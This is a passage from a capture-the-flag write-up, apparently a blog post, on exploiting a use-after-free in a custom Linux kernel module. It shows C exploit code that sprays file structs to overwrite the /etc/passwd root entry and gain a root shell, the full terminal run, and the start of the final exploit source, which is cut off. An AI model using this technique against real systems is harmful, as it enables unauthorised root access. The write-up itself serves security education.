+&lt;p&gt;At this moment, we have successfully completed the UAF exploitation by writing to an arbitrary file. However, during this process, we have messed up with the kernel memory, and this leads to kernel panic after running &lt;code&gt;su root&lt;&#x2F;code&gt; and some other commands.&lt;&#x2F;p&gt;
+&lt;p&gt;By the time a process ends, it decrements the &lt;code&gt;f_count&lt;&#x2F;code&gt; of all the file descriptors in its file descriptor table. As there are two file descriptors pointing to the same file struct, it could be creating a double free which ends in kernel panic. However, after fixing this, it keeps breaking for some other reason.&lt;&#x2F;p&gt;
+&lt;p&gt;After some time, we can find a good solution. It is not the cleanest way of solving the problem, but it definitely works. We can fork at the beginning of the exploit, wait until the corruption process ends, and finally run the &lt;code&gt;su root&lt;&#x2F;code&gt; command from the clean process so we don&#x27;t have to mess with bad kernel memory:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Fork &amp;amp; wait for success&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	pid = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fork&lt;&#x2F;span&gt;&lt;span&gt;();
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(pid == -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to fork for a new process&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else if&lt;&#x2F;span&gt;&lt;span&gt;(pid == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Waiting for corruption completion.
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	 	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Changing user to root.
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span&gt;*argvx[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] = { &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;bin&#x2F;su&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL &lt;&#x2F;span&gt;&lt;span&gt;};
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execve&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;bin&#x2F;su&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;amp;argvx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;		
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Should never be reached.
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Entering eternal loop.	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Corruption process has been completed. Waiting for a root shell...&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;have-fun&quot;&gt;Have fun :)&lt;&#x2F;h3&gt;
+&lt;p&gt;Time to have fun! Now we can elevate our privileges to root and do whatever we want:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;home&#x2F;user $ id
+&lt;&#x2F;span&gt;&lt;span&gt;uid=1000(user) gid=1000(user) groups=1000(user)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;home&#x2F;user $ .&#x2F;exploit
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Fork &amp;amp; wait for success
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Opening LKM
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Opening tmp file
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Allocating some bytes into tmp file to prevent bus error
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Mapping tmp file into memory
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Limiting max amount of file descriptors
+&lt;&#x2F;span&gt;&lt;span&gt;[+] RLIMIT_NOFILE set to:
+&lt;&#x2F;span&gt;&lt;span&gt;[+]     rlim_cur = 0
+&lt;&#x2F;span&gt;&lt;span&gt;[+]     rlim_max = 4096
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Forcing file struct release. Expecting EBADF:
+&lt;&#x2F;span&gt;&lt;span&gt;exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+&lt;&#x2F;span&gt;&lt;span&gt;exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Extending max amount of file descriptors
+&lt;&#x2F;span&gt;&lt;span&gt;[+] RLIMIT_NOFILE set to:
+&lt;&#x2F;span&gt;&lt;span&gt;[+]     rlim_cur = 4096
+&lt;&#x2F;span&gt;&lt;span&gt;[+]     rlim_max = 4096
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Spraying file structs pointing to &#x2F;etc&#x2F;passwd
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Checking for successful UAF. Content should be from &#x2F;etc&#x2F;passwd:
+&lt;&#x2F;span&gt;&lt;span&gt;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span&gt;user:x:1000:1000:user:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Overwriting &#x2F;etc&#x2F;passwd root entry. Content should have been modified:
+&lt;&#x2F;span&gt;&lt;span&gt;root::0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash
+&lt;&#x2F;span&gt;&lt;span&gt;user:x:1000:1000:user:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span&gt;[+] Corruption process has been completed. Waiting for a root shell...
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;home&#x2F;user # id
+&lt;&#x2F;span&gt;&lt;span&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;home&#x2F;user # ls -l &#x2F;flag
+&lt;&#x2F;span&gt;&lt;span&gt;----------    1 root     root            27 Jun 22 11:03 &#x2F;flag
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;home&#x2F;user # cat &#x2F;flag
+&lt;&#x2F;span&gt;&lt;span&gt;CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;final-exploit&quot;&gt;Final Exploit&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;* Tested on Linux 6.6.34
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;home&#x2F;user $ id
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;uid=1000(user) gid=1000(user) groups=1000(user)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;home&#x2F;user $ .&#x2F;exploit
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Fork &amp;amp; wait for success
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Opening LKM
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Opening tmp file
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Allocating some bytes into tmp file to prevent bus error
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Mapping tmp file into memory
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Limiting max amount of file descriptors
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] RLIMIT_NOFILE set to:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+]	rlim_cur = 0
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+]	rlim_max = 4096
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Forcing file struct release. Expecting EBADF:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Extending max amount of file descriptors
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] RLIMIT_NOFILE set to:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+]	rlim_cur = 4096
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+]	rlim_max = 4096
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Spraying file structs pointing to &#x2F;etc&#x2F;passwd
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Checking for successful UAF. Content should be from &#x2F;etc&#x2F;passwd:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;user:x:1000:1000:user:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Overwriting &#x2F;etc&#x2F;passwd root entry. Content should have been modified:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;root::0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;user:x:1000:1000:user:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;[+] Corruption process has been completed. Waiting for a root shell...
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;home&#x2F;user # id
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;home&#x2F;user #
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;*&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;_GNU_SOURCE
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdio.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdint.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdlib.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;fcntl.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;unistd.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;errno.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;err.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sys&#x2F;ioctl.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;string.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pthread.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sys&#x2F;time.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sys&#x2F;resource.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sys&#x2F;types.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sys&#x2F;mman.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;string.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;IOCTL_CTF_INSTALL_FILE	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_IOWR&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x41&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;IOCTL_CTF_CLOSE_FILE	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_IOWR&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x42&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;DEVICE_FILE &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;dev&#x2F;ctf&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;TMP_FILE &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;home&#x2F;user&#x2F;tmp&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; ioctl IOCTL_CTF_INSTALL_FILE wrapper.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;device_fd&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fd&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; installed_fd = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ioctl&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, IOCTL_CTF_INSTALL_FILE, fd);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(installed_fd &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;warn&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[!] IOCTL_CTF_INSTALL_FILE failed&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; installed_fd;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; ioctl IOCTL_CTF_CLOSE_FILE wrapper.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;close_file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;device_fd&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fd&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; res = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ioctl&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, IOCTL_CTF_CLOSE_FILE, fd);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(res &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] IOCTL_CTF_INSTALL_FILE failed&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Limits the available amount of open files handable by the current process.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;set_fd_limit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cur&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; rlimit new, old;
+&lt;&#x2F;span&gt;&lt;span&gt;	new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rlim_cur &lt;&#x2F;span&gt;&lt;span&gt;= cur;
+&lt;&#x2F;span&gt;&lt;span&gt;	new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rlim_max &lt;&#x2F;span&gt;&lt;span&gt;= max;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; res = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;prlimit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getpid&lt;&#x2F;span&gt;&lt;span&gt;(), RLIMIT_NOFILE, &amp;amp;new, &amp;amp;old);
